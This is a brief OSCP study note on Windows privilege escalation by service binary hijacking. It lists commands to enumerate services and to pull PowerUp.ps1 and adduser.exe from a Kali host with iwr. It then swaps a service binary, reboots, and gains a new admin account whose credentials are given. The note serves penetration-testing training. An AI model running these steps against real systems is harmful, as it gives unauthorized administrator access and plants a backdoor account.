https://aditya-3.gitbook.io/oscp/readme/privilege-escalation/windows/service-binary-hijacking
```
Getting a list of all running services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

To identify what services current user can modify, use PowerUp.ps1 (script located in ~/Documents/tools, just start http server from there and transfer with iwr)

From there just add a new admin user using adduser.exe (same thing, just iwr from kali to windows)
move [path to file] [filename] (to take out the binary)
move .\adduser.exe [path to file] (to replace the binary)
restart the service, if its auto just restart the machine (shutdown /r /t 0)
creds of new user is dave2:password123!
```